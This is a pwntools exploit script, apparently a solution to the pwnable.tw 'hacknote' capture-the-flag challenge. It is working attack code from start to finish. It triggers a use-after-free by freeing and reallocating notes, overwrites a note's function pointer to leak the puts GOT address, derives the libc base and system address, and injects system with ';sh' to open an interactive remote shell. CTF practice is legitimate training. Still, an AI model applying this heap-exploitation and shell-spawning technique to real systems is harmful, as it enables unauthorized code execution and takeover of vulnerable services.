#!/usr/bin/env python3
# -*- coding= utf-8 -*-

from pwn import *
import time
host = "chall.pwnable.tw" 
port = 10102

r = remote(host,port)
# r = process('./hacknote')

def add(size,content):
	size = str(size)
	content = flat([content])
	time.sleep(0.1)
	r.recvuntil(':')
	r.send('1')	
	s = r.recvuntil(':')
	r.send(size)
	r.recvuntil(':')
	r.send(content)


def remove(index):
	index = str(index)
	time.sleep(0.1)
	r.recvuntil(':')
	r.send('2')
	r.recvuntil(':')
	r.send(index)
	

def pri(index):
	index = str(index)
	time.sleep(0.1)
	r.recvuntil(':')
	r.send('3')	
	r.recvuntil(':')
	r.send(index)

def exit():
	r.send('4')

add(40,'good')
add(40,'bad')
remove(1)
remove(0)

print_content = 0x0804862B
puts_got =  0x0804A024
payload = flat([print_content,puts_got])
# print(payload)
add(8,payload)
#input()
# r.interactive()
# #pir(1)
time.sleep(0.1)
r.recvuntil(':')
r.send('3')
r.recvuntil(':')
input()
r.send('1')

s = r.recv(4)
print(s)
print(hex(int.from_bytes(s, byteorder='little')))

puts_libc = 0x6f590#0x5f140#me 0x6f590
system_libc = 0x44620#0x3a940#me 0x44620

libc_base = int.from_bytes(s, byteorder='little') -puts_libc
print('libc_base = '+hex(libc_base))

system_pos = libc_base+system_libc
remove(2)
add(8,flat([system_pos,';sh\x00']))
pri(1)


r.interactive()
